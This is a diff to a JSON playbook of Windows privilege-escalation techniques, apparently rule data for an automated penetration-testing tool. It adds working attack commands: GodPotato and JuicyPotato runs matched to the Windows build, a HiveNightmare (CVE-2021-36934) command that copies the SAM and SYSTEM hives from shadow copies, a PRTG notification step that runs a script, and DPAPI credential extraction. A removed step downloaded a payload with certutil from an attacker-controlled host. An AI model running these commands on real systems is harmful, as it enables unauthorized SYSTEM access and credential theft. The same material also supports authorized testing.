@@ -65,10 +65,12 @@
     {
       "id": "seimpersonate",
       "title": "SeImpersonatePrivilege (Potato Family)",
-      "hypothesis": "Service identities (IIS, MSSQL) nearly always carry SeImpersonatePrivilege, which lets them grab and impersonate a SYSTEM token - the whole potato lineage. The key to not wasting a run: MATCH THE POTATO TO THE WINDOWS BUILD UP FRONT. The wrong potato for the build fails with a cryptic \"the handle is invalid\", so read the build first and pick deliberately - GodPotato for Server 2012-2022 and Win8-11, PrintSpoofer when the spooler/named-pipe path is up (2016/2019/Win10), JuicyPotato only on legacy builds. Confirm the preconditions too: SeImpersonate present, x64, a writable staging dir.",
+      "hypothesis": "Service identities (IIS, MSSQL) nearly always carry SeImpersonatePrivilege, which lets them grab and impersonate a SYSTEM token - the whole potato lineage. The key to not wasting a run: MATCH THE POTATO TO THE WINDOWS BUILD UP FRONT. The wrong potato for the build fails with a cryptic \"the handle is invalid\", so read the build first and pick deliberately - GodPotato or PrintSpoofer for modern Server 2019+ / Win10 1809+ (Build >= 17763), and JuicyPotato for legacy Server 2016 / Win10 < 1809 (Build <= 14393). Confirm the preconditions too: SeImpersonate present, x64, a writable staging dir.",
       "tool": "godpotato",
       "tools": [
-        "godpotato"
+        "godpotato",
+        "printspoofer",
+        "juicypotato"
       ],
       "os": [
         "windows"
@@ -104,17 +106,17 @@
         {
           "tool": "sh",
           "run": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
-          "note": "MATCH THE BUILD FIRST (this prevents the failure): Server 2012/2016/2019/2022 or Win8-11 -> GodPotato (broadest, most reliable). Spooler/named-pipe reachable on 2016/2019/Win10 -> PrintSpoofer. Only a legacy build (2008/2012, Win7) with the old COM path -> JuicyPotato. Picking the wrong one is what throws \"the handle is invalid\"."
+          "note": "MATCH THE BUILD FIRST (prevents \"the handle is invalid\"): Modern Server 2019+ / Win10 1809+ (Build >= 17763) -> GodPotato or PrintSpoofer. Legacy Server 2016 / Win10 < 1809 (Build <= 14393) -> JuicyPotato (or GodPotato/PrintSpoofer)."
         },
         {
           "tool": "sh",
-          "run": "certutil -urlcache -f http://{{lhost}}:8000/GodPotato-NET4.exe gp.exe",
-          "note": "Drop the potato you chose for the build (served from your box). GodPotato is the safe default across modern Windows; substitute PrintSpoofer.exe / JuicyPotatoNG.exe if the build pointed you there."
+          "run": "GodPotato-NET4.exe -cmd \"cmd /c whoami > C:\\\\Windows\\\\Temp\\\\proof.txt\"",
+          "note": "MODERN (Server 2019+ / Win10 1809+ Build >= 17763): GodPotato-NET4.exe (or PrintSpoofer64.exe -i -c \"cmd /c whoami\"). Prove SYSTEM with a harmless write first, then fire your payload."
         },
         {
           "tool": "sh",
-          "run": "gp.exe -cmd \"cmd /c whoami > C:\\\\Windows\\\\Temp\\\\proof.txt\"",
-          "note": "Prove SYSTEM with a harmless write first, read it back, then fire your real payload. If it still errors here, the potato-troubleshoot card catches the build-mismatch case."
+          "run": "JuicyPotato.exe -l 1337 -p C:\\\\Windows\\\\System32\\\\cmd.exe -a \"/c whoami > C:\\\\Windows\\\\Temp\\\\proof.txt\" -t *",
+          "note": "LEGACY (Server 2016 / Win10 < 1809 Build <= 14393): Classic DCOM OXID resolver potato for older builds before Microsoft blocked custom OXID resolution in Build 17763."
         }
       ]
     },
@@ -495,6 +497,11 @@
           "tool": "impacket-secretsdump",
           "run": "impacket-secretsdump {{domain}}/{{user}}:'{{password}}'@{{target}}",
           "note": "Or dump remotely when you already hold admin creds on the box."
+        },
+        {
+          "tool": "cmd",
+          "run": "icacls C:\\Windows\\System32\\config\\SAM & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM %TEMP%\\SAM.bak & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM %TEMP%\\SYSTEM.bak",
+          "note": "HiveNightmare / SeriousSAM (CVE-2021-36934): if BUILTIN\\Users has read (RX) on System32\\config\\SAM and shadow copies exist, copy SAM and SYSTEM straight from HarddiskVolumeShadowCopy1 as a low-priv user."
         }
       ]
     },
@@ -729,9 +736,16 @@
         "icacls",
         "sc"
       ],
+      "os": [
+        "windows"
+      ],
       "requires_any": [
         "privesc.weak_service_permission",
-        "foothold.windows"
+        "privesc.dll_hijack_candidate"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
       ],
       "produces": [
         "access.system"
@@ -770,7 +784,9 @@
           "note": "Plant it with the expected name and restart the service to run as SYSTEM."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.windows"
+      ]
     },
     {
       "id": "windows-schtask-abuse",
@@ -783,9 +799,11 @@
         "schtasks",
         "icacls"
       ],
+      "os": [
+        "windows"
+      ],
       "requires_any": [
-        "privesc.scheduled_task",
-        "foothold.windows"
+        "privesc.scheduled_task"
       ],
       "produces": [
         "access.system"
@@ -824,7 +842,13 @@
           "note": "Run the task now, or wait for its schedule; it executes your payload as SYSTEM."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.windows"
+      ],
+      "deprioritize_when": [
+        "access.system",
+        "access.admin"
+      ]
     },
     {
       "id": "windows-patch-exploit",
@@ -838,10 +862,13 @@
         "Watson",
         "searchsploit"
       ],
+      "os": [
+        "windows"
+      ],
+      "speculative": true,
       "requires_any": [
         "privesc.patch_gap",
-        "exploit.candidate",
-        "foothold.windows"
+        "exploit.candidate"
       ],
       "produces": [
         "access.system"
@@ -880,7 +907,13 @@
           "note": "Read the exploit first, then run it and confirm nt authority\\system."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.windows"
+      ],
+      "deprioritize_when": [
+        "access.system",
+        "access.admin"
+      ]
     },
     {
       "id": "uac-bypass",
@@ -896,6 +929,7 @@
       "os": [
         "windows"
       ],
+      "speculative": true,
       "requires_any": [
         "foothold.windows"
       ],
@@ -936,7 +970,11 @@
           "note": "High Mandatory Level confirms full admin; clean up the registry key afterward."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ]
     },
     {
       "id": "com-hijack",
@@ -953,6 +991,7 @@
       "os": [
         "windows"
       ],
+      "speculative": true,
       "requires_any": [
         "foothold.windows"
       ],
@@ -993,7 +1032,11 @@
           "note": "The next privileged instantiation runs your DLL; membership confirms it, and the key is a persistence foothold."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "access.system",
+        "access.admin"
+      ]
     },
     {
       "id": "windows-service-dacl-abuse",
@@ -1008,8 +1051,7 @@
         "windows"
       ],
       "requires_any": [
-        "privesc.weak_service_permission",
-        "foothold.windows"
+        "privesc.weak_service_permission"
       ],
       "produces": [
         "access.system"
@@ -1053,7 +1095,13 @@
           "note": "Server Operators / service control execution: Members of Server Operators or principals with SERVICE_CHANGE_CONFIG over a service (such as VSS) can modify its binPath, cycle the service, and execute arbitrary commands as NT AUTHORITY\\SYSTEM."
         }
       ],
-      "requires_all": []
+      "requires_all": [
+        "foothold.windows"
+      ],
+      "deprioritize_when": [
+        "access.system",
+        "access.admin"
+      ]
     },
     {
       "id": "windows-namedpipe-impersonation",
@@ -1067,6 +1115,7 @@
       "os": [
         "windows"
       ],
+      "speculative": true,
       "requires_any": [
         "foothold.windows"
       ],
@@ -1107,7 +1156,11 @@
           "note": "After ImpersonateNamedPipeClient and DuplicateTokenEx you run as the client; a SYSTEM result confirms it, then capture proof."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "access.system",
+        "access.admin"
+      ]
     },
     {
       "id": "nsclient-web-privesc",
@@ -1154,6 +1207,10 @@
           "run": "curl -s -k -u \"admin:{{nsclient_password}}\" \"https://{{target}}:8443/api/v1/scripts/ext/run\"",
           "note": "INVOKE NSCLIENT SCRIPT API: Test authenticated REST API connectivity with extracted password to verify execution permissions."
         }
+      ],
+      "deprioritize_when": [
+        "access.system",
+        "access.admin"
       ]
     },
     {
@@ -1314,11 +1371,13 @@
         "windows"
       ],
       "speculative": true,
-      "requires_all": [],
+      "requires_all": [
+        "http.reachable",
+        "credential.available"
+      ],
       "requires_any": [
         "vuln.prtg",
-        "credential.available",
-        "http.reachable"
+        "web.server"
       ],
       "produces": [
         "foothold.windows",
@@ -1346,6 +1405,11 @@
           "run": "powershell -Command \"Invoke-WebRequest -Uri 'http://{{target}}/api/setnotification' -WebSession $sess -Method Post -Body @{name='pwn'; action='exec'; script='shell.bat'}\"",
           "note": "Automate PRTG notification configuration via PowerShell web request session."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.windows",
+        "access.admin",
+        "access.system"
       ]
     },
     {
@@ -1390,6 +1454,10 @@
           "run": "copy documentation.chm \"{{target_doc_path}}\\instructions.chm\"",
           "note": "Place the compiled help document into the monitored administrative review directory."
         }
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
       ]
     },
     {
@@ -1435,6 +1503,11 @@
           "run": "powershell -c \"$cred = Import-Clixml -Path 'C:\\Data\\Users\\administrator\\iot-admin.xml'; $cred.GetNetworkCredential().Password\"",
           "note": "Extract plaintext administrative credentials from DPAPI-encrypted PSCredential XML files under the SYSTEM context."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.windows",
+        "access.admin",
+        "access.system"
       ]
     }
   ]
